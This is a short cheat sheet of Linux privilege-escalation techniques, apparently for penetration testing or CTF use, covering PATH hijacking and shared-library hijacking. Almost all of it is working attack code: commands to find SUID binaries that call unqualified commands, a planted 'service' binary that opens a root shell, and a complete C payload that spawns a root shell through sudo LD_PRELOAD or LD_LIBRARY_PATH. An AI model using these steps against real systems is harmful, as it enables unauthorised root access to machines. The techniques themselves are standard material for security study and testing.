# PATH Hijack & Library Hijacking

### Find scripts calling commands without full path

If a SUID binary or cron job calls a command without absolute path — Hijackable

```bash
find / -perm -4000 2>/dev/null
strings /usr/local/bin/suspicious | grep -v "/"
# Look for: service, curl, cat, etc. without /usr/bin/ prefix
```

---

### Create malicious binary in PATH

Prepend writable directory to PATH — Hijack command execution

```bash
echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
/usr/local/bin/suspicious
# Calls "service" which now runs /tmp/service = root shell
```

---

### Writable PATH directories

Check if any PATH directories are writable

```bash
echo $PATH | tr ':' '\n' | xargs -I{} ls -ld {} 2>/dev/null
```

---

### LD_PRELOAD hijack

If sudo env_keep has LD_PRELOAD — Instant root

```bash
# Check: sudo -l → look for env_keep+=LD_PRELOAD

cat > /tmp/shell.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
EOF
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so /tmp/shell.c
sudo LD_PRELOAD=/tmp/shell.so <allowed_command>
```

---

### LD_LIBRARY_PATH hijack

Missing shared libraries — Create your own

```bash
ldd /usr/local/bin/suspicious
# If any show "not found" = you can create it
gcc -fPIC -shared -o /tmp/libcustom.so shell.c
sudo LD_LIBRARY_PATH=/tmp <allowed_command>
```

---
